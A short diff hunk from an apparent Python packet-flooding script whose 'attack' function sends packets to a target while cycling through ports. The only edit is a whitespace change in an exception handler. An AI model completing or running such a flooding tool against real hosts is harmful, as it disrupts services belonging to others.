@@ -54,7 +54,7 @@ def attack(target, port, num_packets, time_interval_seconds):
             attack_num += 1
             port = (port + 1) % 65535
             print(f"Sent {attack_num} packet to {target} through port: {port}")
-    except Exception as e:
+    except  Exception as  e:
         print("An error occurred during the attack:", e)
 
 def start_attack():
